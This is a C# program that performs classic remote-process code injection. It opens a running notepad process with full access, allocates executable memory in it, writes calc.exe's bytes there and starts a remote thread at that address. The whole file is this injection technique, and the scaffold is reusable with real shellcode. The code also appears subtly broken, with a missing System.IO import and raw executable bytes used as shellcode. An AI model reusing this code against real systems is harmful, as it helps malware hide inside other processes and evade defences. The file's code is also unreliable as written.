using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Diagnostics;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId
            );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, 
            IntPtr lpAddress,
            uint dwSize, 
            uint flAllocationType, 
            uint flProtect
            );

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten
            );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes, 
            uint dwStackSize, 
            IntPtr lpStartAddress,
            IntPtr lpParameter, 
            uint dwCreationFlags, 
            out IntPtr lpThreadId
            );

        public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

        static void Main(string[] args)
        {
            byte[] buf = File.ReadAllBytes(@"C:\windows\system32\calc.exe");

            int targetProcessId = Process.GetProcessesByName("notepad")[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, targetProcessId);

            IntPtr address = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)MemoryProtection.ExecuteReadWrite);

            IntPtr outSize = IntPtr.Zero;

            WriteProcessMemory(hProcess, address, buf, buf.Length, out outSize);

            IntPtr none;

            CreateRemoteThread(hProcess,IntPtr.Zero, 0, address, IntPtr.Zero, 0, out none);
        }
    }
}